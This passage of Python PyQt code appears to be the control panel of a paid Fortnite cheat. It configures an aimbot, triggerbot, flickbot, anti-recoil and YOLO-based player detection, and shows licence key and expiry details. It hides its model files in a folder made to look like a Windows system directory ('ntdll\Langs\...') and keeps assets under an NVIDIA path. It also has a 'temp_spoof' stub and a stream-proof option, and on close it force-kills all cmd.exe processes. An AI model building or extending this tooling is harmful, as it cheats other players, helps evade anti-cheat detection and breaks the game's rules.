        visual_layout.addSpacing(5)
        visual_layout.addWidget(separator_line4)

        # # Add a "Preview" button
        # self.preview_button = QPushButton("Preview")
        # self.preview_button.setStyleSheet(self.get_button_style())
        # visual_layout.addWidget(self.preview_button)
        # visual_layout.addWidget(separator_line4)

        # Connect the button click to a function to open the new window
        #self.preview_button.clicked.connect(self.show_preview_window)
        visual_layout.addWidget(self.Welcome_label_3)


        extra_layout = QVBoxLayout()
        extra_layout.addWidget(self.CupMode_On_checkbox)
        extra_layout.addWidget(self.Enable_TriggerBot_checkbox)
        extra_layout.addWidget(self.Require_Keybind_checkbox)
        button_container_layout08 = QHBoxLayout()
        button_container_layout08.addWidget(self.hotkey_label3)
        button_container_layout08.setAlignment(Qt.AlignLeft)
        button_container_layout08.addWidget(self.btn_hotkey3)
        extra_layout.addLayout(button_container_layout08)
        button_container_layout09 = QHBoxLayout()
        button_container_layout09.addWidget(self.slider5)
        button_container_layout09.addWidget(self.Auto_Fire_Fov_Size_label)
        extra_layout.addLayout(button_container_layout09)
        button_container_layout10 = QHBoxLayout()
        button_container_layout10.addWidget(self.slider6)
        button_container_layout10.addWidget(self.Auto_Fire_Confidence_label)
        extra_layout.addLayout(button_container_layout10)
        extra_layout.addSpacing(5)
        extra_layout.addWidget(separator_line5)
        extra_layout.addSpacing(5)
        extra_layout.addWidget(self.Reduce_Bloom_checkbox)
        extra_layout.addWidget(self.AntiRecoil_On_checkbox)
        extra_layout.addWidget(self.Require_ADS_checkbox) 
        button_container_layout11 = QHBoxLayout()
        button_container_layout11.addWidget(self.slider60)
        button_container_layout11.addWidget(self.AntiRecoil_Strength_label)
        extra_layout.addLayout(button_container_layout11)
        # extra_layout.addSpacing(3)
        # extra_layout.addWidget(self.tempspoof_button)
        extra_layout.addSpacing(5)
        extra_layout.addWidget(separator_line6)
        extra_layout.addWidget(self.Welcome_label_4)

        profile_layout = QVBoxLayout()
        profile_layout.addWidget(self.info_label_3)
        profile_layout.addWidget(self.info_label_4)
        profile_layout.addWidget(self.info_label_5)
        profile_layout.addWidget(self.info_label_6)
        profile_layout.addWidget(self.info_label_7)
        profile_layout.addSpacing(3)
        profile_layout.addWidget(separator_line7)
        profile_layout.addSpacing(3)
        profile_layout.addWidget(self.info_label_8)
        #profile_layout.addWidget(self.info_label_9)
        profile_layout.addWidget(self.info_label_10)
        profile_layout.addWidget(self.info_label_11)
        profile_layout.addWidget(self.info_label_13)

        profile_layout.addSpacing(3)

        profile_layout.addWidget(self.btn_extraini)

        profile_layout.addSpacing(5)
        profile_layout.addWidget(separator_line9)
        profile_layout.addWidget(self.Welcome_label_5)

        advanced_layout = QVBoxLayout()
        advanced_layout.addSpacing(3)
        advanced_layout.addWidget(self.Use_Model_Class_checkbox)
        advanced_layout.addSpacing(3)
        # Image Scaling
        button_container_layout_class = QHBoxLayout()
        button_container_layout_class.addWidget(self.img_value_combobox)
        button_container_layout_class.addWidget(self.img_value_label)
        advanced_layout.addLayout(button_container_layout_class)
        advanced_layout.addSpacing(3)
        # Model Selector
        button_container_layout_model = QHBoxLayout()
        button_container_layout_model.addWidget(self.model_selected_combobox)
        button_container_layout_model.addWidget(self.model_selected_label)
        advanced_layout.addLayout(button_container_layout_model)
        advanced_layout.addSpacing(3)
        # Max Detections
        button_container_layout_maxdet = QHBoxLayout()
        button_container_layout_maxdet.addWidget(self.slider4)
        button_container_layout_maxdet.addWidget(self.Max_Detections_label)
        advanced_layout.addLayout(button_container_layout_maxdet)
        # Model FPS
        button_container_layout_fps = QHBoxLayout()
        button_container_layout_fps.addWidget(self.slider_fps)
        button_container_layout_fps.addWidget(self.fps_label)
        advanced_layout.addLayout(button_container_layout_fps)
        advanced_layout.addSpacing(5)
        advanced_layout.addWidget(separator_line13)
        advanced_layout.addWidget(self.Welcome_label_6)

        aimbot_layout.setAlignment(Qt.AlignTop)
        slots_layout.setAlignment(Qt.AlignTop)
        flickbot_layout.setAlignment(Qt.AlignTop)
        visual_layout.setAlignment(Qt.AlignTop)
        extra_layout.setAlignment(Qt.AlignTop)
        profile_layout.setAlignment(Qt.AlignTop)
        advanced_layout.setAlignment(Qt.AlignTop)
        stacked_widget = QStackedWidget()
        stacked_widget.addWidget(QWidget())
        stacked_widget.addWidget(QWidget())
        stacked_widget.addWidget(QWidget())
        stacked_widget.addWidget(QWidget())
        stacked_widget.addWidget(QWidget())
        stacked_widget.addWidget(QWidget())
        stacked_widget.addWidget(QWidget())
        stacked_widget.widget(0).setLayout(aimbot_layout)
        stacked_widget.widget(1).setLayout(slots_layout)
        stacked_widget.widget(2).setLayout(flickbot_layout)
        stacked_widget.widget(3).setLayout(visual_layout)
        stacked_widget.widget(4).setLayout(extra_layout)
        stacked_widget.widget(5).setLayout(profile_layout)
        stacked_widget.widget(6).setLayout(advanced_layout)
        layout = QVBoxLayout()
        layout.addLayout(banner_layout)
        layout.addWidget(button_container)
        layout.addWidget(separator_line)
        layout.addWidget(stacked_widget)
        self.setLayout(layout)


        def set_button_style(selected_button):
            btn_aimbot.setStyleSheet(self.menu_tab_selected_style() if selected_button == "Aimbot" else menu_tab_style)
            btn_aimbot.setIcon(QIcon(f"C:\ProgramData\elysium\Assets\Imagess\\skull-highlighted.png") if selected_button == "Aimbot" else QIcon("C:\\ProgramData\\elysium\\Assets\\Imagess\\skull.png"))

            btn_slots.setStyleSheet(self.menu_tab_selected_style() if selected_button == "Slots" else menu_tab_style)
            btn_slots.setIcon(QIcon("C:\ProgramData\elysium\Assets\Imagess\\gun-highlighted.png") if selected_button == "Slots" else QIcon("C:\\ProgramData\\elysium\\Assets\\Imagess\\gun.png"))

            btn_flickbot.setStyleSheet(self.menu_tab_selected_style() if selected_button == "Flickbot" else menu_tab_style)
            btn_flickbot.setIcon(QIcon("C:\ProgramData\elysium\Assets\Imagess\\bullet-highlighted.png") if selected_button == "Flickbot" else QIcon("C:\\ProgramData\\elysium\\Assets\\Imagess\\bullet.png"))

            btn_visual.setStyleSheet(self.menu_tab_selected_style() if selected_button == "Visual" else menu_tab_style)
            btn_visual.setIcon(QIcon("C:\ProgramData\elysium\Assets\Imagess\\view-highlighted.png") if selected_button == "Visual" else QIcon("C:\\ProgramData\\elysium\\Assets\\Imagess\\view.png"))

            btn_extra.setStyleSheet(self.menu_tab_selected_style() if selected_button == "Extra" else menu_tab_style)
            btn_extra.setIcon(QIcon("C:\ProgramData\elysium\Assets\Imagess\\application-highlighted.png") if selected_button == "Extra" else QIcon("C:\\ProgramData\\elysium\\Assets\\Imagess\\application.png"))

            btn_profile.setStyleSheet(self.menu_tab_selected_style() if selected_button == "Profile" else menu_tab_style)
            btn_profile.setIcon(QIcon("C:\ProgramData\elysium\Assets\Imagess\\profile-highlighted.png") if selected_button == "Profile" else QIcon("C:\\ProgramData\\elysium\\Assets\\Imagess\\profile.png"))

            btn_advanced.setStyleSheet(self.menu_tab_selected_style() if selected_button == "Model" else menu_tab_style)
            btn_advanced.setIcon(QIcon("C:\ProgramData\elysium\Assets\Imagess\\brain-highlighted.png") if selected_button == "Model" else QIcon("C:\\ProgramData\\elysium\\Assets\\Imagess\\brain.png"))

        set_button_style("Aimbot")
        btn_aimbot.clicked.connect(lambda: set_button_style("Aimbot"))
        btn_slots.clicked.connect(lambda: set_button_style("Slots"))
        btn_flickbot.clicked.connect(lambda: set_button_style("Flickbot"))
        btn_visual.clicked.connect(lambda: set_button_style("Visual"))
        btn_extra.clicked.connect(lambda: set_button_style("Extra"))
        btn_profile.clicked.connect(lambda: set_button_style("Profile"))
        btn_advanced.clicked.connect(lambda: set_button_style("Model"))
        btn_aimbot.clicked.connect(lambda: stacked_widget.setCurrentIndex(0))
        btn_slots.clicked.connect(lambda: stacked_widget.setCurrentIndex(1))
        btn_flickbot.clicked.connect(lambda: stacked_widget.setCurrentIndex(2))
        btn_visual.clicked.connect(lambda: stacked_widget.setCurrentIndex(3))
        btn_extra.clicked.connect(lambda: stacked_widget.setCurrentIndex(4))
        btn_profile.clicked.connect(lambda: stacked_widget.setCurrentIndex(5))
        btn_advanced.clicked.connect(lambda: stacked_widget.setCurrentIndex(6))

        self.slider.valueChanged.connect(self.on_slider_value_change)
        self.slider0.valueChanged.connect(self.on_slider0_value_change)
        self.slider3.valueChanged.connect(self.on_slider3_value_change)
        self.slider4.valueChanged.connect(self.on_slider4_value_change)
        self.slider5.valueChanged.connect(self.on_slider5_value_change)
        self.slider6.valueChanged.connect(self.on_slider6_value_change)
        self.slider60.valueChanged.connect(self.on_slider60_value_change)

        # Slots
        self.slider_slot1.valueChanged.connect(self.on_slider_slot1_value_change)
        self.slider_slot2.valueChanged.connect(self.on_slider_slot2_value_change)
        self.slider_slot3.valueChanged.connect(self.on_slider_slot3_value_change)
        self.slider_slot4.valueChanged.connect(self.on_slider_slot4_value_change)
        self.slider_slot5.valueChanged.connect(self.on_slider_slot5_value_change)

        self.Enable_Aim_Slot1_checkbox.stateChanged.connect(self.on_checkbox_state_change)
        self.Enable_Aim_Slot2_checkbox.stateChanged.connect(self.on_checkbox_state_change)
        self.Enable_Aim_Slot3_checkbox.stateChanged.connect(self.on_checkbox_state_change)
        self.Enable_Aim_Slot4_checkbox.stateChanged.connect(self.on_checkbox_state_change)
        self.Enable_Aim_Slot5_checkbox.stateChanged.connect(self.on_checkbox_state_change)

        self.flick_scope_slider.valueChanged.connect(self.on_flick_scope_slider_value_change)
        self.flick_cool_slider.valueChanged.connect(self.on_flick_cool_slider_value_change)
        self.flick_delay_slider.valueChanged.connect(self.on_flick_delay_slider_value_change)
        self.aim_bone_combobox.currentIndexChanged.connect(self.update_aim_bone)
        self.smoothing_type_combobox.currentIndexChanged.connect(self.update_smoothing_type)
        self.box_type_combobox.currentIndexChanged.connect(self.update_box_type)
        self.Enable_Aim_checkbox.stateChanged.connect(self.on_checkbox_state_change)
        self.Enable_Slots_checkbox.stateChanged.connect(self.on_checkbox_state_change)
        self.Show_Fov_checkbox.stateChanged.connect(self.on_checkbox_state_change)
        self.Show_Crosshair_checkbox.stateChanged.connect(self.on_checkbox_state_change)
        self.Show_Detections_checkbox.stateChanged.connect(self.on_checkbox_state_change)
        self.Show_Aimline_checkbox.stateChanged.connect(self.on_checkbox_state_change)
        self.Require_Keybind_checkbox.stateChanged.connect(self.on_checkbox_state_change)
        self.Show_Debug_checkbox.stateChanged.connect(self.on_checkbox_state_change)
        self.Show_Fov_checkbox.stateChanged.connect(self.on_checkbox_state_change)
        self.Show_CMD_checkbox.stateChanged.connect(self.on_checkbox_state_change)
        self.Enable_TriggerBot_checkbox.stateChanged.connect(self.on_checkbox_state_change)
        self.Controller_On_checkbox.stateChanged.connect(self.on_checkbox_state_change)
        self.CupMode_On_checkbox.stateChanged.connect(self.on_checkbox_state_change)
        #self.Streamproof_checkbox.stateChanged.connect(self.on_checkbox_state_change)
        self.Reduce_Bloom_checkbox.stateChanged.connect(self.on_checkbox_state_change)
        self.Require_ADS_checkbox.stateChanged.connect(self.on_checkbox_state_change)
        self.AntiRecoil_On_checkbox.stateChanged.connect(self.on_checkbox_state_change)
        self.Enable_Flick_checkbox.stateChanged.connect(self.on_checkbox_state_change)
        #self.hue_slider.valueChanged.connect(self.update_rgb_label)
        #self.lightness_slider.valueChanged.connect(self.update_rgb_label)
        #self.opacity_slider.valueChanged.connect(self.update_rgb_label)
        self.Use_Hue_checkbox.stateChanged.connect(self.on_checkbox_state_change)
        self.Use_Model_Class_checkbox.stateChanged.connect(self.on_checkbox_state_change)
        self.img_value_combobox.currentIndexChanged.connect(self.update_img_value)

        self.model_selected_combobox.currentIndexChanged.connect(self.on_model_selected)

        self.slider_fps.valueChanged.connect(self.on_slider_fps_value_change)

        try:
            self.font_size = open("C:\\ProgramData\\elysium\\Assets\\size.txt", "r").read()
        except:
            self.font_size = 16

        self.update_stylesheet()

    def load_modelss(self):
        try:
            model_files = [f for f in os.listdir('model') if f.endswith(('.engine', '.pt', '.onnx'))]
        except:
            model_files = [f for f in os.listdir(open(rf"{current_directory}\model","r").read()) if f.endswith(('.engine', '.pt', '.onnx'))]

        # Load default models from specified directory
        default_model_dir = 'C:\\ProgramData\\SoftworkCR\\ntdll\\Langs\\EN-US\\DatetimeConfigurations\\Cr\\'
        default_model_files = [f for f in os.listdir(default_model_dir) if f.endswith(('.engine', '.pt'))]

        # Map user-friendly labels to actual file names
        default_models = {}
        for file in default_model_files:
            if 'FortnitePro' in file:
                label = "FortnitePro" + os.path.splitext(file)[1]
                default_models[label] = file 
            elif 'Fortnite' in file:
                label = "Fortnite" + os.path.splitext(file)[1]
                default_models[label] = file 
            # elif 'FortnitePro' in file:
            # 	label = "FortnitePro" + os.path.splitext(file)[1]
            # 	default_models[label] = file 
            # elif 'WINDOWSEN' in file:
            # 	label = "NiteZero" + os.path.splitext(file)[1]
            # 	default_models[label] = file 
            # elif 'WINDOWSUN' in file:
            # 	label = "UniversalZero" + os.path.splitext(file)[1]
            # 	default_models[label] = file 

        self.modelss = {}

        invalid_models = []
        for model_file in model_files:
            try:
                model_path = os.path.join('model', model_file)
            except:
                model_path = os.path.join(open(rf"{current_directory}\model","r").read(), model_file)
            try:
                model_instance = YOLO(model_path, task='detect')
                self.modelss[model_file] = model_instance
                self.model_selected_combobox.addItem(model_file)
            except Exception as e:
                invalid_models.append(model_file)

        # Process default models
        for label, file_name in default_models.items():
            model_path = os.path.join(default_model_dir, file_name)
            try:
                model_instance = YOLO(model_path, task='detect')
                self.modelss[label] = model_path  # Store the path for later use
                self.model_selected_combobox.addItem(label)
            except Exception as e:
                invalid_models.append(label)

        # Set default model if no models are loaded
        if not model_files and not default_models:
            message = "No model files found in the directory, using default model."
            caption = "Error 0401: Model Finding Error"
            message_type = 0x10
            ctypes.windll.user32.MessageBoxW(0, message, caption, message_type)
            if default_models:
                default_model = next(iter(default_models.values()), None)
                if default_model:
                    MyWindow.modell = YOLO(os.path.join(default_model_dir, default_model))
            return

        # Select the last loaded model or fallback to the first available model
        if Last_Model and Last_Model in self.modelss:
            try:
                model_path = self.modelss[Last_Model]
                MyWindow.modell = YOLO(model_path, task='detect')
                self.model_selected_combobox.setCurrentText(Last_Model)
            except Exception as e:
                fallback_model = next(iter(self.modelss.values()), None)
                if fallback_model:
                    MyWindow.modell = fallback_model
                    self.model_selected_combobox.setCurrentIndex(0)
        else:
            fallback_model = next(iter(self.modelss.values()), None)
            if fallback_model:
                MyWindow.modell = fallback_model
                self.model_selected_combobox.setCurrentIndex(0)

        # Report any invalid models
        if invalid_models:
            invalid_models_str = "\n".join(invalid_models)
            message = f"The following models failed to load and are being ignored:\n\n{invalid_models_str}"
            caption = "Error 0407: Model Loading Error"
            message_type = 0x10
            ctypes.windll.user32.MessageBoxW(0, message, caption, message_type)

    def on_model_selected(self):
        global Last_Model
        model_name = self.model_selected_combobox.currentText()

        default_models = [
            'Fortnite'
        ]

        # Determine if the selected model is from the 'model' directory or default directory
        model_path = None
        if any(default_model in model_name for default_model in default_models):
            # Get the actual file name for the selected default model
            file_name = self.modelss.get(model_name, None)
            if file_name:
                model_path = os.path.join('C:\\ProgramData\\SoftworkCR\\ntdll\\Langs\\EN-US\\DatetimeConfigurations\\Cr', file_name)
        else:
            try:
                model_path = os.path.join(os.path.abspath('model'), model_name)
            except:
                model_path = os.path.join(os.path.abspath('../model'), model_name)

        if model_path and os.path.isfile(model_path):
            try:
                MyWindow.modell = YOLO(model_path, task='detect')
                self.modelss[model_name] = model_path
            except Exception as e:
                message = f"Failed to load model {model_name} from {model_path}.\n\nError Details: {e}"
                caption = "Error 0437: Model Loading Failure"
                message_type = 0x10
                ctypes.windll.user32.MessageBoxW(0, message, caption, message_type)
        else:
            message = f"Model {model_name} not found at {model_path}."
            caption = "Error 0444: Model Not Found"
            message_type = 0x10
            ctypes.windll.user32.MessageBoxW(0, message, caption, message_type)

        Last_Model = model_name
        self.auto_save_config()

    def update_theme_color(self):
        import re

        # Validate hex color code
        hex_color = self.color_input.text()
        if not re.fullmatch(r'#(?:[0-9a-fA-F]{3}){1,2}', hex_color):
            hex_color = '#ff0000'  # Default to red if invalid

        self.theme_hex_color = "#ffffff"#"#0084ff"
        self.update_stylesheet()
        self.update_button_style()
        self.update_menu_tab_style()
        self.update_slider_style()
        self.update_label_colors()
        self.update()
        self.auto_save_config()

    def update_button_style(self):
        button_style = self.get_button_style()
        for button in self.findChildren(QPushButton):
            button.setStyleSheet(button_style)

    def update_menu_tab_style(self):
        menu_tab_style = self.menu_tab_selected_style()
        for button in self.findChildren(QPushButton):
            if "menu_tab" in button.objectName():
                button.setStyleSheet(menu_tab_style)

    def update_slider_style(self):
        slider_style = self.get_slider_style()
        for slider in self.findChildren(QSlider):
            slider.setStyleSheet(slider_style)

    def update_stylesheet(self):
        menu_main_style = f"""
            QWidget {{
                background-color: #000000;
                color: #ffffff;
                font-size: {self.font_size}px;
            }}
            QSlider::groove:horizontal {{
                border: 1px solid {self.widget_border_color};
                height: 10px;
                border-radius: 5px;
            }}
            QSlider::handle:horizontal {{
                background: {self.widget_bg_color};
                width: 10px;
                margin: -1px -1px;
                border-radius: 5px;
                border: 1px solid {self.theme_hex_color};
            }}
            QSlider::handle:horizontal:hover {{
                background: {self.theme_hex_color};
                border-color: {self.widget_border_color};
            }}

            QCheckBox::indicator:checked {{
                background: {self.theme_hex_color};
                image: url(C:/ProgramData/NVIDIA/NGX/models/config/o.png);
            }}
            QCheckBox::indicator:unchecked {{
                background: {self.widget_bg_color};
                image: url(C:/ProgramData/NVIDIA/NGX/models/config/x.png);
            }}
            QCheckBox::indicator {{
                border-radius : 5px;
                width: 20px;
                height: 20px;

            }}
            QCheckBox::indicator:focus {{
                background-color: transparent;
            }}

            QComboBox {{
                background-color: {self.widget_bg_color};
                color: #ffffff;
                font-size: {self.font_size}px;
                border-radius: 5px;
                border: 1px {self.widget_border_color};
                padding: 5px 30px 5px 8px;
            }}
            QComboBox::drop-down {{
                subcontrol-origin: padding;
                subcontrol-position: top right;
                width: 20px;
                border-left-width: 1px;
                border-left-color: {self.widget_border_color};
                border-left-style: solid;
                border-top-right-radius: 5px;
                border-bottom-right-radius: 5px;
                background-color: {self.theme_hex_color};
            }}
            QComboBox::down-arrow {{
                width: 10px;
                height: 10px;
                image: url(C:/ProgramData/NVIDIA/NGX/models/config/d.png);
            }}
            QComboBox QAbstractItemView {{
                background-color: {self.widget_bg_color};
                color: #ffffff;
                selection-background-color: {self.theme_hex_color};
                selection-color: #ffffff;
                border: 1px solid {self.widget_border_color};
                border-radius: 5px;
                padding: 8px;
                font-size: {self.font_size}px;
            }}
            QLineEdit {{ 
                border: 2px solid {self.theme_hex_color};
            }}
        """

        self.setStyleSheet(menu_main_style)

    def get_slider_style(self):
        # return f"""
        # 	QSlider::groove:horizontal {{
        # 	border: 1px solid {self.widget_bg_color};
        # 	height: 12px;
        # 	border-radius: 6px;
        # 	}}
        # 	QSlider::handle:horizontal {{
        # 	background: {self.widget_bg_color};
        # 	width: 12px;
        # 	border-radius: 6px;
        # 	}}
        # 	QSlider::handle:horizontal:hover {{
        # 	background: {self.theme_hex_color};
        # 	border-color: {self.widget_border_color};
        # 	border-radius: 6px;
        # 	}}
        # 	QSlider::add-page:qlineargradient {{
        # 	background: qlineargradient(x1:0, y1:0, x2:0, y2:1, stop:0 {self.widget_bg_color}, stop:1 {self.widget_border_color});
        # 	border-radius: 6px;
        # 	}}
        # 	QSlider::sub-page:qlineargradient {{
        # 	background: {self.theme_hex_color};
        # 	border-radius: 6px;
        # 	}}
        # """
        return f"""
QLineEdit {{
    border: 1px solid #7b00ff;
    background-color: #4077c9;
    color: #abb2bf;
    border-radius: 4px;
    font-weight: bold;
}}

QSlider::groove:horizontal {{
    border: 1px solid #7b00ff;
    height: 8px;
    background: #000000;
    border-radius: 4px;
}}

QSlider::handle:horizontal {{
    background: #000000;
    border: 2px solid #7b00ff;
    width: 12px;
    height: 12px;
    margin: -4px 0;
    border-radius: 7px;
}}

QSlider::sub-page:horizontal {{
    background: #7b00ff;
    border-radius: 4px;
}}

"""
    def format_time_difference(self,timestamp):
        timestamp_datetime = datetime.fromtimestamp(int(timestamp))
        now = datetime.now()
        difference = now - timestamp_datetime

        total_seconds = int(difference.total_seconds())
        if total_seconds < -10000:
            total_seconds = abs(total_seconds)

        minutes = 60
        hours = 3600
        days = 86400
        months = 2592000
        years = 31536000
        if total_seconds >= years:
            years_count = total_seconds // years
            return f"{years_count} year{'s' if years_count > 1 else ''}"
        if total_seconds >= months:
            months_count = total_seconds // months
            return f"{months_count} month{'s' if months_count > 1 else ''}"
        elif total_seconds >= days:
            days_count = total_seconds // days
            return f"{days_count} day{'s' if days_count > 1 else ''}"
        elif total_seconds >= hours:
            hours_count = total_seconds // hours
            return f"{hours_count} hour{'s' if hours_count > 1 else ''}"
        elif total_seconds >= minutes:
            minutes_count = total_seconds // minutes
            return f"{minutes_count} minute{'s' if minutes_count > 1 else ''}"
        else:
            seconds_count = total_seconds
            return f"{seconds_count} second{'s' if seconds_count > 1 else ''}"

    def get_button_style(self):
        return f"""
            QPushButton {{
                background-color: {self.theme_hex_color};
                color: white; border-radius:
                6px; border:
                2px solid {self.theme_hex_color};
                height: 20px;
            }} 

            QPushButton:hover {{
                background-color: {self.theme_hex_color};
            }}

            QPushButton:pressed {{ 
                background-color: {self.theme_hex_color}; 
            }}
        """

    def menu_tab_selected_style(self):
        return f"""
            QPushButton {{
                border: none;
                padding-bottom: 6px;
                margin-left: 60%;
                margin-right: 60%;
            }}
        """ #border-bottom: 2px solid {self.theme_hex_color};

    def create_mask(self):
        path = QPainterPath()
        radius = 5
        path.addRoundedRect(QRectF(0, 0, self.width(), self.height()), radius, radius)
        mask = QRegion(path.toFillPolygon().toPolygon())
        return mask
    def paintEvent(self, event):
        painter = QPainter(self)
        painter.setRenderHint(QPainter.Antialiasing)
        painter.setBrush(self.palette().window())
        painter.setPen(Qt.NoPen) 
        painter.drawRoundedRect(self.rect(), 20, 20)
        super().paintEvent(event)
        #painter.drawRoundedRect(rect, 6, 6)

    def update_label_colors(self):
        # Update the color for each label
        self.info_label_3.setText(f"<font color='{self.theme_hex_color}'>User Info:</font>")
        self.info_label_8.setText(f"<font color='{self.theme_hex_color}'>Hotkeys:</font>")
        #self.info_label_9.setText(f"Close Normally: <font color='{self.theme_hex_color}'>[X]</font>")
        self.info_label_10.setText(f"Quick On/Off: <font color='{self.theme_hex_color}'>[F1]</font>")
        self.info_label_11.setText(f"Close: <font color='{self.theme_hex_color}'>[F2]</font>")
        self.info_label_13.setText(f"Toggle Menu: <font color='{self.theme_hex_color}'>[INS]</font>")

    def update_labels(self):
        self.info_label_4.setText(f"Your Key: " + api.user_data.username[:20] + "*******")
        self.info_label_5.setText(f"Purchased: " + self.format_time_difference(api.user_data.createdate) + " ago")
        self.info_label_7.setText(f"Last Login: " + self.format_time_difference(api.user_data.lastlogin) + " ago")
        self.info_label_6.setText(f"Expiry: in " + self.format_time_difference(api.user_data.expires))

    def toggle_menu_visibility(self):
        if self.isVisible():
            try:
                self.hide()
            except:
                time.sleep(0.15)
                self.hide()
        else:
            try:
                self.show()
                self.raise_()
                self.activateWindow()
            except:
                time.sleep(0.15)
                self.show()
                self.raise_()
                self.activateWindow()


    def auto_save_config(self):
        #hue = self.hue_slider.value()
        #opacity = self.opacity_slider.value()
        #lightness = self.lightness_slider.value()
        color = self.calculate_color("0084ff", "", "")  # Pass lightness to calculate_color

        men_color = "#131521"

        if not men_color.startswith('#') or len(men_color) not in [7, 9]:
            men_color = '#fc0000'  # Default to white if invalid

        config_settings = {
            "Fov_Size": Fov_Size,
            "Confidence": Confidence,
            "Aim_Smooth": Aim_Smooth,
            "Max_Detections": Max_Detections,
            "Aim_Bone": Aim_Bone,
            "Smoothing_Type": Smoothing_Type,
            "Box_type": Box_type,
            "Enable_Aim": bool(Enable_Aim),
            "Enable_Slots": bool(Enable_Slots),
            "Controller_On": bool(Controller_On),
            "Keybind": self.Keybind,
            "Keybind2": self.Keybind2,
            "Enable_TriggerBot": bool(Enable_TriggerBot),
            "Show_Fov": bool(Show_Fov),
            "Show_Crosshair": bool(Show_Crosshair),
            "Show_Debug": bool(Show_Debug),
            "Show_FPS": bool(Show_FPS),
            "Auto_Fire_Fov_Size": Auto_Fire_Fov_Size,
            "Show_Detections": bool(Show_Detections),
            "Show_Aimline": bool(Show_Aimline),
            "Auto_Fire_Confidence": Auto_Fire_Confidence,
            "Auto_Fire_Keybind": self.Auto_Fire_Keybind,
            "Require_Keybind": bool(Require_Keybind),
            "Use_Hue": bool(Use_Hue),
            "CupMode_On": bool(CupMode_On),
            "Reduce_Bloom": bool(Reduce_Bloom),
            "Require_ADS": bool(Require_ADS),
            "AntiRecoil_On": bool(AntiRecoil_On),
            "AntiRecoil_Strength": AntiRecoil_Strength,
            "Theme_Hex_Color": men_color,
            "Enable_Flick_Bot": Enable_Flick_Bot,
            "Flick_Scope_Sens": Flick_Scope_Sens,
            "Flick_Cooldown": Flick_Cooldown,
            "Flick_Delay": Flick_Delay,
            "Flickbot_Keybind": self.Flickbot_Keybind,
            "Streamproof": Streamproof,

            "Enable_Aim_Slot1": bool(Enable_Aim_Slot1),
            "Enable_Aim_Slot2": bool(Enable_Aim_Slot2),
            "Enable_Aim_Slot3": bool(Enable_Aim_Slot3),
            "Enable_Aim_Slot4": bool(Enable_Aim_Slot4),
            "Enable_Aim_Slot5": bool(Enable_Aim_Slot5),
            "Slot1_Keybind": self.Slot1_Keybind,
            "Slot2_Keybind": self.Slot2_Keybind,
            "Slot3_Keybind": self.Slot3_Keybind,
            "Slot4_Keybind": self.Slot4_Keybind,
            "Slot5_Keybind": self.Slot5_Keybind,
            "Slot6_Keybind": self.Slot6_Keybind,
            "Fov_Size_Slot1": Fov_Size_Slot1,
            "Fov_Size_Slot2": Fov_Size_Slot2,
            "Fov_Size_Slot3": Fov_Size_Slot3,
            "Fov_Size_Slot4": Fov_Size_Slot4,
            "Fov_Size_Slot5": Fov_Size_Slot5,

            "Use_Model_Class": bool(Use_Model_Class),
            "Img_Value": Img_Value,
            "Model_FPS": Model_FPS,
            "Last_Model": Last_Model,

            "game": {
                "pixel_increment": pixel_increment,
                "randomness": randomness,
                "sensitivity": sensitivity,
                "distance_to_scale": distance_to_scale,
                "dont_launch_overlays": dont_launch_overlays,
                "use_mss": use_mss,
                "hide_masks":hide_masks
            }
        }

        global Keybind
        global Keybind2
        global Auto_Fire_Keybind
        global Flickbot_Keybind
        global Slot1_Keybind
        global Slot2_Keybind
        global Slot3_Keybind
        global Slot4_Keybind
        global Slot5_Keybind
        global Slot6_Keybind

        Keybind = self.Keybind
        Keybind2 = self.Keybind2
        Auto_Fire_Keybind = self.Auto_Fire_Keybind
        Flickbot_Keybind = self.Flickbot_Keybind
        Slot1_Keybind = self.Slot1_Keybind
        Slot2_Keybind = self.Slot2_Keybind
        Slot3_Keybind = self.Slot3_Keybind
        Slot4_Keybind = self.Slot4_Keybind
        Slot5_Keybind = self.Slot5_Keybind
        Slot6_Keybind = self.Slot6_Keybind

        with open('./config.json', 'w') as outfile:
            jsond.dump(config_settings, outfile, indent=4)

        self.update_labels()

    def closeEvent(self, event):
        self.auto_save_config()
        try:
            console_window = ctypes.windll.kernel32.GetConsoleWindow()
            ctypes.windll.user32.PostMessageW(console_window, 0x10, 0, 0)
            #event.accept()
        except:
            try:
                sys.exit()
            except:
                os.system('taskkill /f /fi "imagename eq cmd.exe" 1>NUL 2>NUL')

    def update_aim_bone(self, index):
        self.Aim_Bone = self.aim_bone_combobox.currentText()
        global Aim_Bone
        if self.aim_bone_combobox.currentText() == "Head":
            Aim_Bone = "Head"
        if self.aim_bone_combobox.currentText() == "Neck":
            Aim_Bone = "Neck"
        if self.aim_bone_combobox.currentText() == "Body":
            Aim_Bone = "Body"
        self.auto_save_config()

    def update_smoothing_type(self, index):
        self.Smoothing_Type = self.smoothing_type_combobox.currentText()
        global Smoothing_Type
        if self.smoothing_type_combobox.currentText() == "Default":
            Smoothing_Type = "Default"
        if self.smoothing_type_combobox.currentText() == "Bezier":
            Smoothing_Type = "Bezier"
        if self.smoothing_type_combobox.currentText() == "Catmull-Rom":
            Smoothing_Type = "Catmull"
        if self.smoothing_type_combobox.currentText() == "Hermite":
            Smoothing_Type = "Hermite"
        if self.smoothing_type_combobox.currentText() == "B-Spline":
            Smoothing_Type = "B-Spline"
        if self.smoothing_type_combobox.currentText() == "Sine":
            Smoothing_Type = "Sine"
        if self.smoothing_type_combobox.currentText() == "Exponential":
            Smoothing_Type = "Exponential"
        self.auto_save_config()

    def update_box_type(self, index):
        self.Box_type = self.box_type_combobox.currentText()
        global Box_type
        if self.box_type_combobox.currentText() == "Regular":
            Box_type = "Regular"
        if self.box_type_combobox.currentText() == "Corner":
            Box_type = "Corner"
        if self.box_type_combobox.currentText() == "Filled":
            Box_type = "Filled"
        self.auto_save_config()


    def update_img_value(self, index):
        self.Img_Value = self.img_value_combobox.currentText()
        global Img_Value
        if self.img_value_combobox.currentText() == "320":
            Img_Value = "320"
        if self.img_value_combobox.currentText() == "480":
            Img_Value = "480"
        if self.img_value_combobox.currentText() == "640":
            Img_Value = "640"
        if self.img_value_combobox.currentText() == "736":
            Img_Value = "736"
        if self.img_value_combobox.currentText() == "832":
            Img_Value = "832"
        self.auto_save_config()

    def temp_spoof(self):
        ...

    def refresh_extra(self):

        global pixel_increment
        global randomness
        global sensitivity
        global distance_to_scale
        global dont_launch_overlays
        global use_mss
        global hide_masks

        #SECRET CONFIG
        secretfile = open('./config.json')
        secretconfig = jsond.load(secretfile)["game"]
        pixel_increment = secretconfig['pixel_increment']
        randomness = secretconfig['randomness']
        sensitivity = secretconfig['sensitivity']
        distance_to_scale = secretconfig['distance_to_scale']
